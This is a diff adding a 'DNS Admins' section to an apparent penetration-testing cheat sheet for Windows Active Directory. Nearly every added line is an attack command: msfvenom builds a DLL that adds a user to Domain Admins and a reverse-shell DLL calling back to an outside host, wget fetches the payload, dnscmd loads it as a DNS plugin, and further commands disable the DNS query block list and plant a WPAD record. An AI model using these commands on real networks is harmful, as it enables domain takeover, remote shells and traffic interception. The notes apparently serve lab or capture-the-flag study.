@@ -263,6 +263,23 @@ Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Va
 # ^ filter process events by -eq 4688
 ```
 
+## DNS Admins
+```bash
+msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll # do malicious dll file on local machine
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.15.61 LPORT=9001 -f dll > reverse.dll
+python3 -m http.server <port> # local machine
+wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll" # take file from local machine
+Get-ADGroupMember -Identity DnsAdmins # Power Shell
+dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll # loading dll as non-privileged user
+wmic useraccount where name="<name_of_user" get sid # get sid of typed user
+sc.exe sdshow DNS # check perms of service
+sc <stop/start> dns # if have perms to start or stop dns ^
+net group "Domain Admins" /dom # verify that perms is escalated
+Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <dc.name.local> # disable block list
+Add-DnsServerResourceRecordA -Name wpad -ZoneName <name.local> -ComputerName <dc.name.local> -IPv4Address <ip>
+```
+## Print operators
+
 
 
 
